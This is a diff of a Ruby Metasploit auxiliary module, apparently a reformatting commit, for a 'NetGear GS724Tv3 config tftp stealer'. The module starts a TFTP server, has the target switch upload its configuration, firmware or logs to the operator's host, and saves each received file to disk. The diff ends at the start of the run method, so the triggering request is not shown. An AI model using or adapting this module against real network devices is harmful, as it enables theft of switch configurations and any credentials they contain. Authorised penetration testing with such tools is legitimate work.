@@ -1,31 +1,33 @@
 require 'msf/core'
 
+# FIXME needs more testing
+
 class Metasploit3 < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
 
   def initialize
     super(
-          'Name'        => 'NetGear GS724Tv3 config tftp stealer',
-          'Version'     => '0.1',
-          'Description' => %q{This module will start a tftp server and instruct the 
-                            Netgear switch to uploads its configuration},
-          'Author'      => 'Mario Manno <mario.manno@googlemail.com>',
-          'License'     =>  GPL_LICENSE
-         )
+      'Name'        => 'NetGear GS724Tv3 config tftp stealer',
+      'Version'     => '0.1',
+      'Description' => %q{This module will start a tftp server and instruct the 
+                        Netgear switch to uploads its configuration},
+                        'Author'      => 'Mario Manno <mario.manno@googlemail.com>',
+                        'License'     =>  GPL_LICENSE
+    )
 
     deregister_options('VHOST')
     register_options([
-      OptString.new('OUTPUTDIR', [ false, "The directory where we should save the configuration files", '/tmp']),
-      OptAddress.new('LHOST', [ false, "The IP address of the system running this module" ]),
-      OptEnum.new('FILETYPE', [ false, "Wich object to download", 'txtcfg',
-        %w{code txtcfg errorlog messagelog traplog}])
+        OptString.new('OUTPUTDIR', [ false, "The directory where we should save the configuration files", '/tmp']),
+        OptAddress.new('LHOST', [ false, "The IP address of the system running this module" ]),
+        OptEnum.new('FILETYPE', [ false, "Wich object to download", 'txtcfg',
+                    %w{code txtcfg errorlog messagelog traplog}])
     ], self.class)
   end
 
-	#
-	# Start the TFTP Server
+  #
+  # Start the TFTP Server
   # see modules/auxiliary/scanner/snmp/cisco_config_tftp.rb 
-	#
+  #
   def setup
     # Setup is called only once
     print_status("Starting TFTP server...")
@@ -37,51 +39,51 @@ class Metasploit3 < Msf::Auxiliary
     @main_thread = ::Thread.current
   end
 
-	#
-	# Kill the TFTP server
-	#
-	def cleanup
-		# Cleanup is called once for every single thread
-		if ::Thread.current == @main_thread
-			# Wait 5 seconds for background transfers to complete
-			print_status("Providing some time for transfers to complete...")
-			::IO.select(nil, nil, nil, 45.0)
+  #
+  # Kill the TFTP server
+  #
+  def cleanup
+    # Cleanup is called once for every single thread
+    if ::Thread.current == @main_thread
+      # Wait 5 seconds for background transfers to complete
+      print_status("Providing some time for transfers to complete...")
+      ::IO.select(nil, nil, nil, 45.0)
 
-			print_status("Shutting down the TFTP service...")
-			if @tftp
-				@tftp.close rescue nil
-				@tftp = nil
-			end
-		end
-	end
+      print_status("Shutting down the TFTP service...")
+      if @tftp
+        @tftp.close rescue nil
+        @tftp = nil
+      end
+    end
+  end
 
-	#
-	# Callback for incoming files
-	#
-	def process_incoming(info)
-		return if not info[:file]
-		name = info[:file][:name]
-		data = info[:file][:data]
-		from = info[:from]
-		return if not (name and data)
+  #
+  # Callback for incoming files
+  #
+  def process_incoming(info)
+    return if not info[:file]
+    name = info[:file][:name]
+    data = info[:file][:data]
+    from = info[:from]
+    return if not (name and data)
 
-		# Trim off IPv6 mapped IPv4 if necessary
-		from = from[0].dup
-		from.gsub!('::ffff:', '')
+    # Trim off IPv6 mapped IPv4 if necessary
+    from = from[0].dup
+    from.gsub!('::ffff:', '')
 
-		print_status("Incoming file from #{from} - #{name} #{data.length} bytes")
+    print_status("Incoming file from #{from} - #{name} #{data.length} bytes")
 
-		# Save the configuration file if a path is specified
-		if datastore['OUTPUTDIR']
-			name = "#{from}.txt"
-			::FileUtils.mkdir_p(datastore['OUTPUTDIR'])
-			path = ::File.join(datastore['OUTPUTDIR'], name)
-			::File.open(path, "wb") do |fd|
-				fd.write(data)
-			end
-			print_status("Saved configuration file to #{path}")
-		end
-	end
+    # Save the configuration file if a path is specified
+    if datastore['OUTPUTDIR']
+      name = "#{from}.txt"
+      ::FileUtils.mkdir_p(datastore['OUTPUTDIR'])
+      path = ::File.join(datastore['OUTPUTDIR'], name)
+      ::File.open(path, "wb") do |fd|
+        fd.write(data)
+      end
+      print_status("Saved configuration file to #{path}")
+    end
+  end
 
   def run
     print_status("Attempting to retrieve #{datastore['RPATH']}...")
